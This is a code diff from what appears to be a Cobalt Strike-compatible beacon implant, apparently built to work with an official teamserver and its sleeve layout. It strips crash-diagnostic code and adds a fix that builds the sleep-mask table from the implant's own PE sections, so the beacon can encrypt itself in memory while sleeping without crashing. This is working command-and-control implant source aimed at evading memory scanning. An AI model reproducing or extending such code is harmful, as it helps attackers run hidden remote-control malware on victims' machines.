@@ -259,104 +259,20 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
 }
 
-#if defined(_M_X64)
-/* Log an exception raised inside the sleep-mask BOF and swallow it, so the
- * beacon survives to sleep again and the fault address lands in the file. */
-static int sm_invoke_filter(EXCEPTION_POINTERS * ep) {
-	HANDLE h;
-	char lb[128];
-	DWORD wr;
-	int n;
-	h = CreateFileA("C:\\Users\\Public\\sm_exc.txt", FILE_APPEND_DATA,
-		FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (h == INVALID_HANDLE_VALUE)
-		return EXCEPTION_EXECUTE_HANDLER;
-	n = wsprintfA(lb, "code=%08X addr=%p\r\n",
-		ep->ExceptionRecord->ExceptionCode, ep->ExceptionRecord->ExceptionAddress);
-	WriteFile(h, lb, (DWORD)n, &wr, NULL);
-	CloseHandle(h);
-	return EXCEPTION_EXECUTE_HANDLER;
-}
-
-static DWORD sm_invoke_seh(void * fn, GARGLEP * gp, DWORD t) {
-	__try {
-		((void (*)(GARGLEP *, void *, DWORD))fn)(gp, (void *)Sleep, t);
-		return 0;
-	}
-	__except (sm_invoke_filter(GetExceptionInformation())) {
-		return 1;
-	}
-}
-
-static void sm_dump_prots(char * buf, int * np, void * p, char * tag) {
-	MEMORY_BASIC_INFORMATION m;
-	if (p == NULL || VirtualQuery(p, &m, sizeof(m)) == 0) {
-		*np += wsprintfA(buf + *np, "%s=?\r\n", tag);
-		return;
-	}
-	*np += wsprintfA(buf + *np, "%s ab=%p alloc=%08X prot=%08X state=%08X type=%08X\r\n",
-		tag, m.AllocationBase, m.AllocationProtect, m.Protect, m.State, m.Type);
-}
-
-/* last byte offset covered by the (real) sections table, for RWX flips */
-static DWORD sm_max_end(GARGLEP * gp) {
-	DWORD maxe = 0;
-	int i;
-	if (gp == NULL || gp->sections == NULL)
-		return 0;
-	for (i = 0; i < 64; i++) {
-		DWORD a = gp->sections[i * 2];
-		DWORD b = gp->sections[i * 2 + 1];
-		if (a == 0 && b == 0)
-			break;
-		if (a == 0xFFFFFFFFUL || b == 0xFFFFFFFFUL)
-			continue;
-		if (b > maxe)
-			maxe = b;
-	}
-	return maxe;
-}
-
-/* SizeOfImage from our own PE header: the true extent of the mapped image.
- * The TS-delivered GARGLE_SECTIONS table describes the OFFICIAL sleeve
- * layout, which is larger than ours; walking it runs off our mapping. */
-static DWORD sm_image_size(char * base) {
-	unsigned short e_lfanew;
-	if (base == NULL || base[0] != 'M' || base[1] != 'Z')
-		return 0;
-	memcpy(&e_lfanew, base + 0x3C, sizeof(e_lfanew));
-	if (base[e_lfanew] != 'P' || base[e_lfanew + 1] != 'E')
-		return 0;
-	return *(DWORD *)(base + e_lfanew + 0x50);
-}
-
-/* Keep only the first `keep` pairs of the (real) sections table and END it:
- * bisects which masked range kills the process. */
-static void sm_keep_pairs(GARGLEP * gp, int keep) {
-	int i;
-	if (gp == NULL || gp->sections == NULL)
-		return;
-	for (i = 0; i < 64; i++) {
-		if (i == keep || (gp->sections[i * 2] == 0 && gp->sections[i * 2 + 1] == 0)) {
-			gp->sections[i * 2] = 0;
-			gp->sections[i * 2 + 1] = 0;
-			return;
-		}
-	}
-}
-
-/* Build the mask table from OUR OWN PE sections instead of the TS-delivered
- * table. The delivered pairs describe the official sleeve layout; applied to
- * our image they land on different data. Pair 5 (0x62000-0x62100) covers our
- * .pdata: masking it makes any exception dispatch during the Sleep window
- * binary-search garbage RUNTIME_FUNCTION entries and fail-fast the process
- * (uncatchable by SEH, no WER dump). Mask headers + .text + .rdata + .data;
- * skip .pdata / .fptable / .reloc. Returns the new span. */
+/* Build the sleep-mask sections table from OUR OWN PE headers instead of the
+ * TS-delivered SETTING_GARGLE_SECTIONS layout. The delivered pairs are
+ * computed for the official sleeve image; applied verbatim to ours they
+ * cover different data. In the 4.9.1 delivery pair 5 (0x62000-0x62100)
+ * lands on our .pdata: masking it makes any exception dispatch during the
+ * masked Sleep window read garbage RUNTIME_FUNCTION entries and fail-fast
+ * the process. Mask the header page plus .text/.rdata/.data; skip
+ * .pdata/.fptable/.reloc. */
 static DWORD sm_build_own_table(GARGLEP * gp) {
 	static DWORD own[34];
 	unsigned short lfanew, optsize, nsec;
-	unsigned int i;
+	unsigned int i, imgsz;
 	DWORD count = 1;
+	DWORD span = 0x1000;
 	if (gp == NULL || gp->beacon_ptr == NULL)
 		return 0;
 	if (gp->beacon_ptr[0] != 'M' || gp->beacon_ptr[1] != 'Z')
@@ -364,10 +280,11 @@ static DWORD sm_build_own_table(GARGLEP * gp) {
 	memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
 	memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
 	memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
+	memcpy(&imgsz, gp->beacon_ptr + lfanew + 24 + 0x50, sizeof(imgsz));
 	if (lfanew == 0 || lfanew >= 0x400 || optsize < 0xD0 || optsize >= 0x400 ||
-			nsec == 0 || nsec > 16)
+			nsec == 0 || nsec > 16 || imgsz == 0 || imgsz > 0x10000000)
 		return 0;
-	own[0] = 0;               /* PE headers page(s) */
+	own[0] = 0;
 	own[1] = 0x1000;
 	for (i = 0; i < nsec && count < 16; i++) {
 		char * sh = gp->beacon_ptr + lfanew + 24 + optsize + i * 40;
@@ -380,159 +297,21 @@ static DWORD sm_build_own_table(GARGLEP * gp) {
 			continue;
 		memcpy(&vs, sh + 8, 4);
 		memcpy(&va, sh + 12, 4);
-		if (va == 0 || vs == 0 || va >= 0x10000)
+		if (va < 0x1000 || va >= imgsz || vs == 0)
 			continue;
+		if (va + vs > imgsz)
+			vs = imgsz - va;
 		own[count * 2] = va;
 		own[count * 2 + 1] = va + vs;
+		if (va + vs > span)
+			span = va + vs;
 		count++;
 	}
 	own[count * 2] = 0;
 	own[count * 2 + 1] = 0;
 	gp->sections = own;
-	return sm_max_end(gp);
+	return span;
 }
-
-static DWORD g_sm_spanraw;
-static DWORD g_sm_img;
-static char * g_sm_snap;
-static DWORD g_sm_snaplen;
-
-static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
-	DWORD sm_mode, DWORD sm_span, void * entryp) {
-	HANDLE h;
-	char buf[4096];
-	int n = 0;
-	int i;
-	DWORD wr;
-	h = CreateFileA("C:\\Users\\Public\\sm_gparms.txt", GENERIC_WRITE, FILE_SHARE_READ,
-		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (h == INVALID_HANDLE_VALUE)
-		return;
-	n += wsprintfA(buf + n, "t=%u bof=%p blen=%u gp=%p\r\n", t, bof, (unsigned)blen, gp);
-	if (gp == NULL) {
-		WriteFile(h, buf, (DWORD)n, &wr, NULL);
-		CloseHandle(h);
-		return;
-	}
-	n += wsprintfA(buf + n, "beacon_ptr=%p sections=%p heap=%p\r\n",
-		gp->beacon_ptr, gp->sections, gp->heap_records);
-	n += wsprintfA(buf + n, "sm_mode=%u spanraw=%X span=%X img=%X procinj I=%04X F=%04X\r\n",
-		sm_mode, g_sm_spanraw, sm_span, g_sm_img,
-		(unsigned short)setting_short(SETTING_PROCINJ_PERMS_I),
-		(unsigned short)setting_short(SETTING_PROCINJ_PERMS));
-	sm_dump_prots(buf, &n, gp->beacon_ptr, "q_beacon:");
-	if (sm_span != 0)
-		sm_dump_prots(buf, &n, (char *)gp->beacon_ptr + sm_span - 1, "q_beacon_end:");
-	if (gp->beacon_ptr != NULL && g_sm_spanraw != 0) {
-		DWORD off;
-		for (off = 0; off < g_sm_spanraw + 0x10000 && n < 3700; off += 0x10000) {
-			MEMORY_BASIC_INFORMATION m;
-			if (VirtualQuery((char *)gp->beacon_ptr + off, &m, sizeof(m)) == 0) {
-				n += wsprintfA(buf + n, "pg[%05X] ?\r\n", off);
-				continue;
-			}
-			n += wsprintfA(buf + n, "pg[%05X] ab=%p prot=%08X st=%08X\r\n",
-				off, m.AllocationBase, m.Protect, m.State);
-		}
-	}
-	sm_dump_prots(buf, &n, gp->sections, "q_sect:");
-	sm_dump_prots(buf, &n, gp->heap_records, "q_heap:");
-	sm_dump_prots(buf, &n, bof, "q_bof:");
-	/* live bytes at the killer range and the in-memory PE section table */
-	if (bof != NULL) { /* marker that gp->beacon_ptr is valid too */
-		unsigned __int64 v5 = *(unsigned __int64 *)(gp->beacon_ptr + 0x62000);
-		unsigned __int64 v6 = *(unsigned __int64 *)(gp->beacon_ptr + 0x63000);
-		unsigned short lfanew;
-		unsigned short optsize;
-		int sec;
-		n += wsprintfA(buf + n, "k62000=%08X%08X k63000=%08X%08X\r\n",
-			(unsigned)(v5 >> 32), (unsigned)v5, (unsigned)(v6 >> 32), (unsigned)v6);
-		memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
-		memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
-		if (lfanew > 0 && lfanew < 0x400 && optsize >= 0xF0 - 24 && optsize < 0x400) {
-			unsigned short nsec;
-			DWORD sectbl = lfanew + 24 + optsize;
-			memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
-			n += wsprintfA(buf + n, "nsec=%u\r\n", nsec);
-			for (sec = 0; sec < nsec && sec < 8; sec++) {
-				unsigned int vs, va;
-				char nm[9];
-				memcpy(nm, gp->beacon_ptr + sectbl + sec * 40, 8);
-				nm[8] = 0;
-				memcpy(&vs, gp->beacon_ptr + sectbl + sec * 40 + 8, 4);
-				memcpy(&va, gp->beacon_ptr + sectbl + sec * 40 + 12, 4);
-				n += wsprintfA(buf + n, "mem[%u] %-8s va=%06X vs=%06X\r\n", sec, nm, va, vs);
-			}
-		}
-	}
-	if (entryp != NULL) {
-		unsigned __int64 v = *(unsigned __int64 *)entryp;
-		n += wsprintfA(buf + n, "entry=%p bytes=%08X%08X\r\n",
-			entryp, (unsigned)(v >> 32), (unsigned)v);
-	}
-	/* sample the live BOF mapping so it can be diffed against the
-	 * sleepmask.x64.o we disassembled offline */
-	{
-		int s;
-		static const int spots[] = { 0x40, 0x80, 0xc0, 0x100, 0x180 };
-		for (s = 0; s < 5 && bof != NULL; s++) {
-			unsigned __int64 v = *(unsigned __int64 *)(bof + spots[s]);
-			n += wsprintfA(buf + n, "bof[%03X]=%08X%08X\r\n",
-				spots[s], (unsigned)(v >> 32), (unsigned)v);
-		}
-	}
-	if (gp->sections == NULL)
-		n += wsprintfA(buf + n, "sections=NULL\r\n");
-	else {
-		for (i = 0; i < 24 && n < 3200; i++) {
-			DWORD a = gp->sections[i * 2];
-			DWORD b = gp->sections[i * 2 + 1];
-			n += wsprintfA(buf + n, "sec[%d] %08X %08X", i, a, b);
-			if (a == 0 && b == 0) {
-				n += wsprintfA(buf + n, " END\r\n");
-				break;
-			}
-			if (a >= b)
-				n += wsprintfA(buf + n, " BAD_ORDER");
-			if (a == 0xFFFFFFFFUL || b == 0xFFFFFFFFUL)
-				n += wsprintfA(buf + n, " NEG1");
-			n += wsprintfA(buf + n, "\r\n");
-		}
-	}
-	if (gp->heap_records == NULL)
-		n += wsprintfA(buf + n, "heap=NULL FAULT_[rcx+10]\r\n");
-	else {
-		int total = 0;
-		char * harr;
-		char * hend;
-		while (gp->heap_records[total].ptr != NULL)
-			total++;
-		harr = (char *)gp->heap_records;
-		hend = harr + (total + 1) * (int)sizeof(HEAP_RECORD);
-		n += wsprintfA(buf + n, "heapN=%d\r\n", total);
-		for (i = 0; i < 64 && n < 3900; i++) {
-			char * p = gp->heap_records[i].ptr;
-			unsigned z = (unsigned)gp->heap_records[i].size;
-			n += wsprintfA(buf + n, "heap[%d] ptr=%p size=%u", i, p, z);
-			if (p == NULL) {
-				n += wsprintfA(buf + n, " END\r\n");
-				break;
-			}
-			if (bof != NULL && p >= bof && p < bof + blen)
-				n += wsprintfA(buf + n, " IN_BOF");
-			if (p < (char *)gp + sizeof(GARGLEP) && p + z > (char *)gp)
-				n += wsprintfA(buf + n, " COVERS_GPARMS");
-			if (p < hend && p + z > harr)
-				n += wsprintfA(buf + n, " COVERS_HEAP_ARRAY");
-			if (p < (char *)gp->sections + 64 && p + z > (char *)gp->sections)
-				n += wsprintfA(buf + n, " COVERS_SECTIONS");
-			n += wsprintfA(buf + n, "\r\n");
-		}
-	}
-	WriteFile(h, buf, (DWORD)n, &wr, NULL);
-	CloseHandle(h);
-}
-#endif
 
 /*
  * These get somewhat complicated. Here's what the variables mean:
@@ -868,145 +647,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					gparms->sections = info.sections;
 					gparms->heap_records = info.heap_records;
 					memcpy(gparms->mask, info.mask, MASK_SIZE);
+					/* Replace the delivered layout with our own PE section
+					 * ranges (see sm_build_own_table). */
+					sm_build_own_table(gparms);
 				}
-#if defined(_M_X64)
-				/* Diagnostic switches, re-checked on every sleep:
-				   C:\Users\Public\sm_empty -> invoke with an empty sections table
-				   and a terminator-only heap table.
-				   C:\Users\Public\sm_sect  -> real sections, empty heap (XOR image only).
-				   C:\Users\Public\sm_heap  -> empty sections, real heap (XOR heap only).
-				   C:\Users\Public\sm_t1    -> invoke with time=1ms (window discriminator).
-				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to RWX
-				   before invoke (left RWX; tests the RX-write hypothesis). */
-				{
-					static HEAP_RECORD sm_empty_heap[1] = { { NULL, 0 } };
-					DWORD sm_mode = 0;
-					DWORD sm_span;
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_empty") != INVALID_FILE_ATTRIBUTES)
-						sm_mode |= 1;
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_wrwx") != INVALID_FILE_ATTRIBUTES)
-						sm_mode |= 2;
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_sect") != INVALID_FILE_ATTRIBUTES)
-						sm_mode |= 8;
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_heap") != INVALID_FILE_ATTRIBUTES)
-						sm_mode |= 16;
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_t1") != INVALID_FILE_ATTRIBUTES)
-						sm_mode |= 32;
-					/* sm_p1..sm_p6: keep only the first N pairs (bisect) */
-					{
-						int pn;
-						for (pn = 1; pn <= 6; pn++) {
-							char mp[32];
-							wsprintfA(mp, "C:\\Users\\Public\\sm_p%d", pn);
-							if (GetFileAttributesA(mp) != INVALID_FILE_ATTRIBUTES) {
-								sm_mode |= (DWORD)(0x100 << pn);
-								sm_keep_pairs(gparms, pn);
-								break;
-							}
-						}
-					}
-					/* sm_skip5: mask everything except pair index 5.
-					   sm_only5: mask pair index 5's range alone. */
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_skip5") != INVALID_FILE_ATTRIBUTES) {
-						sm_mode |= 0x4000;
-						if (gparms != NULL && gparms->sections != NULL) {
-							gparms->sections[10] = 0;
-							gparms->sections[11] = 0;
-						}
-					}
-					if (GetFileAttributesA("C:\\Users\\Public\\sm_only5") != INVALID_FILE_ATTRIBUTES) {
-						sm_mode |= 0x8000;
-						if (gparms != NULL && gparms->sections != NULL) {
-							gparms->sections[0] = gparms->sections[10];
-							gparms->sections[1] = gparms->sections[11];
-							gparms->sections[2] = 0;
-							gparms->sections[3] = 0;
-						}
-					}
-					sm_span = sm_max_end(gparms);
-					g_sm_spanraw = sm_span;
-					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
-					/* FIX: replace the TS-delivered layout (it describes the
-					 * official sleeve) with our own PE section ranges,
-					 * skipping .pdata/.fptable/.reloc. */
-					if (gparms != NULL)
-						sm_span = sm_build_own_table(gparms);
-					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
-						(void *)inlinefunc);
-					if (gparms != NULL) {
-						if ((sm_mode & 1) != 0) {
-							gparms->sections = empty_sections;
-							gparms->heap_records = sm_empty_heap;
-						}
-						else if ((sm_mode & 8) != 0)
-							gparms->heap_records = sm_empty_heap;
-						else if ((sm_mode & 16) != 0)
-							gparms->sections = empty_sections;
-					}
-					if ((sm_mode & 2) != 0 && gparms != NULL && sm_span != 0) {
-						DWORD sm_old;
-						if (VirtualProtect(gparms->beacon_ptr, sm_span,
-								PAGE_EXECUTE_READWRITE, &sm_old))
-							sm_mode |= 4;
-					}
-					if ((sm_mode & 32) != 0)
-						t = 1;
-					/* snapshot the image so the POST write can prove whether
-					 * the unmask walk restored it byte-for-byte */
-					if (gparms != NULL && sm_span != 0) {
-						g_sm_snaplen = sm_span;
-						g_sm_snap = (char *)malloc(sm_span);
-						if (g_sm_snap != NULL)
-							memcpy(g_sm_snap, gparms->beacon_ptr, sm_span);
-					}
-				}
-#endif
 				if (gparms == NULL)
 					Sleep(t);
-#if defined(_M_X64)
-				else
-					sm_invoke_seh((void *)inlinefunc, gparms, t);
-#else
 				else
 					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
-#endif
-#if defined(_M_X64)
-				/* breadcrumb: proves the BOF returned (crash inside invoke
-				 * never reaches this write); diffs the image against the
-				 * pre-invoke snapshot to test restore fidelity */
-				if (gparms != NULL) {
-					HANDLE ph = CreateFileA("C:\\Users\\Public\\sm_post.txt",
-						FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
-						FILE_ATTRIBUTE_NORMAL, NULL);
-					if (ph != INVALID_HANDLE_VALUE) {
-						char lb[160];
-						DWORD wr2;
-						int ln = wsprintfA(lb, "returned t=%u\r\n", t);
-						if (g_sm_snap != NULL && g_sm_snaplen != 0) {
-							DWORD i3;
-							DWORD firstdiff = g_sm_snaplen;
-							unsigned int diffs = 0;
-							for (i3 = 0; i3 < g_sm_snaplen; i3++) {
-								if ((unsigned char)g_sm_snap[i3] !=
-										(unsigned char)gparms->beacon_ptr[i3]) {
-									if (firstdiff == g_sm_snaplen)
-										firstdiff = i3;
-									diffs++;
-								}
-							}
-							ln += wsprintfA(lb + ln, "diffs=%u first=%06X\r\n",
-								diffs, firstdiff);
-						}
-						WriteFile(ph, lb, (DWORD)ln, &wr2, NULL);
-						CloseHandle(ph);
-					}
-					if (g_sm_snap != NULL) {
-						free(g_sm_snap);
-						g_sm_snap = NULL;
-						g_sm_snaplen = 0;
-					}
-				}
-#endif
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
